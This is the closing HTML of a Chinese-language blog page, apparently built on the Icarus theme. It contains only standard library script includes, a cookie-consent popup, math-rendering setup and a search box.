href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh"><i></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
                renderMathInElement(element);
            });
        });</script><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>